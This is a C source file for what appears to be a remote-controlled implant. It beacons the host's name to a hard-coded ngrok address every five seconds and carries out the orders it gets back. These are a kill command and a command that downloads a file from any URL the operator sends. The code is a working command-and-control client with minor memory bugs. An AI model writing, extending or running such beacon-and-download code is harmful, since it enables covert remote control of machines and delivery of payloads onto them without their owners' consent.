#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <curl/curl.h>
#include "downloader/downloader.h"
#include "requests/http_request.h"

#ifndef _WIN32
#include <sys/utsname.h>
static inline void Sleep(unsigned int ms){sleep(ms / 1000);}
#endif


#define URL "https://allegedly-great-shiner.ngrok-free.app"


size_t callback(char *buffer, size_t itemsize, size_t nitems, void *userdata);
void parse_response(char *command);
char *get_uname(int size_);

int main(){
	size_t resp_size;
	char *response;
	while (1){
		response = NULL;
		resp_size = 0;
		http_get(URL, get_uname(25), &response, &resp_size);
		if (response){
			parse_response(response);
		} else {
			printf("No data recieved\n");
		}
		Sleep(5000);
	}
	free(response);
	return 0;
}

char *get_uname(int size_){
	char *u_name = (char *)malloc(sizeof(char) * size_);
#ifdef _WIN32
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);

	if (GetComputerName(computerName, &size)) {
		strncpy(u_name, computerName, size_);
	} else {
		printf("Failed to get system name on Windows.\n");
	}
#else
	struct utsname name;
	if (uname(&name) != -1) {
		strncpy(u_name, name.nodename, size_);
	} else {
		perror("uname failed on Linux/POSIX");
	}
#endif
	return u_name;
}

#define PUSH_PREFIX "<PUSH>@"
#define PUSH_PREFIX_LEN (sizeof(PUSH_PREFIX) - 1)

void parse_response(char *command){
	if (strcmp(command, "<TERMINATE>") == 0){
		exit(0);
	} else if (strncmp(command, PUSH_PREFIX, PUSH_PREFIX_LEN) == 0){
		const char *download_url = command + PUSH_PREFIX_LEN;
		printf("%s\n", download_url);
		if (download_file(download_url, "download.out") == 0){
			printf("Download successful\n");
		} else {
			printf("Download failed\n");
		}
	}else {
		printf("%s\n", command);
	}
}
